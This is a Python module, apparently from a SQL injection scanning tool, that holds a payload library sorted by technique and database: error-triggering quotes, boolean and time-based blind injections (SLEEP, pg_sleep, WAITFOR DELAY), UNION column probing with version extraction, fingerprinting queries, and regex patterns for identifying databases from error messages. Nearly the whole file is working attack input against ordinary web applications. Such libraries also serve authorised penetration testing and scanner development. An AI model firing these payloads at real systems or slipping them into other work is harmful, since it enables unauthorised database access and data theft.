"""SQL 注入 Payload 库 — 按注入类型和数据库分类"""

# ========== 错误探测 Payload ==========
ERROR_PROBES = [
    # 单引号/双引号/反斜杠 → 触发语法错误
    {"payload": "'", "db": "all", "type": "error_syntax"},
    {"payload": '"', "db": "all", "type": "error_syntax"},
    {"payload": "\\", "db": "all", "type": "error_syntax"},
    {"payload": "'\"", "db": "all", "type": "error_syntax"},
    {"payload": "')", "db": "all", "type": "error_syntax"},
    {"payload": "') --", "db": "all", "type": "error_syntax"},
]

# ========== Boolean-based Blind ==========
BOOLEAN_PAYLOADS = [
    # 通用
    {"payload": "' AND 1=1-- ", "expected": True, "db": "all"},
    {"payload": "' AND 1=2-- ", "expected": False, "db": "all"},
    {"payload": "' OR '1'='1'-- ", "expected": True, "db": "all"},
    {"payload": "' OR '1'='2'-- ", "expected": False, "db": "all"},
    # 数字型
    {"payload": " AND 1=1-- ", "expected": True, "db": "all"},
    {"payload": " AND 1=2-- ", "expected": False, "db": "all"},
    # 括号变体
    {"payload": "') AND 1=1-- ", "expected": True, "db": "all"},
    {"payload": "') AND 1=2-- ", "expected": False, "db": "all"},
    # 双引号变体
    {"payload": '" AND 1=1-- ', "expected": True, "db": "all"},
    {"payload": '" AND 1=2-- ', "expected": False, "db": "all"},
]

# ========== Time-based Blind ==========
TIME_PAYLOADS = [
    # MySQL
    {"payload": "' AND SLEEP(5)-- ", "db": "mysql", "delay": 5},
    {"payload": "' AND BENCHMARK(5000000,MD5(1))-- ", "db": "mysql", "delay": 3},
    # PostgreSQL
    {"payload": "' AND pg_sleep(5)-- ", "db": "postgresql", "delay": 5},
    # MSSQL
    {"payload": "'; WAITFOR DELAY '0:0:5'-- ", "db": "mssql", "delay": 5},
    # Oracle
    {"payload": "' AND DBMS_LOCK.SLEEP(5)-- ", "db": "oracle", "delay": 5},
    # SQLite
    {"payload": "' AND RANDOMBLOB(500000000)-- ", "db": "sqlite", "delay": 3},
]

# ========== Union-based ==========
UNION_PAYLOADS = [
    # 列数探测
    {"payload": "' UNION SELECT NULL-- ", "db": "all", "columns": 1},
    {"payload": "' UNION SELECT NULL,NULL-- ", "db": "all", "columns": 2},
    {"payload": "' UNION SELECT NULL,NULL,NULL-- ", "db": "all", "columns": 3},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 4},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 5},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 6},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 7},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 8},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 9},
    {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", "db": "all", "columns": 10},
    # 带数据的 Union（确定列后替换 NULL）
    {"payload": "' UNION SELECT @@version,NULL,NULL-- ", "db": "mysql", "columns": 3},
    {"payload": "' UNION SELECT version(),NULL,NULL-- ", "db": "postgresql", "columns": 3},
    {"payload": "' UNION SELECT @@version,NULL,NULL,NULL-- ", "db": "mssql", "columns": 4},
]

# ========== 数据库指纹 Payload ==========
DB_FINGERPRINT = [
    # MySQL
    {"payload": "' AND @@version IS NOT NULL-- ", "db": "mysql"},
    {"payload": "' AND CONNECTION_ID() IS NOT NULL-- ", "db": "mysql"},
    # PostgreSQL
    {"payload": "' AND current_database() IS NOT NULL-- ", "db": "postgresql"},
    {"payload": "' AND version() ILIKE '%PostgreSQL%'-- ", "db": "postgresql"},
    # MSSQL
    {"payload": "' AND (SELECT @@servername) IS NOT NULL-- ", "db": "mssql"},
    {"payload": "' AND (SELECT db_name()) IS NOT NULL-- ", "db": "mssql"},
    # Oracle
    {"payload": "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL-- ", "db": "oracle"},
]

# ========== 数据库错误信息特征 ==========
DB_ERROR_PATTERNS = {
    "mysql": [
        "SQL syntax.*MySQL",
        "Warning.*mysql_",
        "MySQLSyntaxErrorException",
        "valid MySQL result",
        "check the manual that corresponds to your (MySQL|MariaDB) server version",
    ],
    "postgresql": [
        "PostgreSQL.*ERROR",
        "Warning.*\\Wpg_",
        "valid PostgreSQL result",
        "PSQLException",
    ],
    "mssql": [
        "Microsoft SQL Server",
        "ODBC SQL Server Driver",
        "SQLServer JDBC Driver",
        "System.Data.SqlClient",
        "com.microsoft.sqlserver",
    ],
    "oracle": [
        "Oracle.*Driver",
        "ORA-\\d{5}",
        "Oracle error",
        "OracleException",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLiteException",
        "System.Data.SQLite",
    ],
}


def get_error_probes() -> list[dict]:
    """获取错误探测 Payload"""
    return ERROR_PROBES


def get_boolean_payloads() -> list[dict]:
    """获取 Boolean-based 盲注 Payload"""
    return BOOLEAN_PAYLOADS


def get_time_payloads() -> list[dict]:
    """获取 Time-based 盲注 Payload"""
    return TIME_PAYLOADS


def get_union_payloads() -> list[dict]:
    """获取 Union-based Payload"""
    return UNION_PAYLOADS


def get_db_fingerprint() -> list[dict]:
    """获取数据库指纹 Payload"""
    return DB_FINGERPRINT


def detect_db_type(error_text: str) -> str | None:
    """根据错误信息识别数据库类型"""
    import re
    for db_type, patterns in DB_ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, error_text, re.IGNORECASE):
                return db_type
    return None
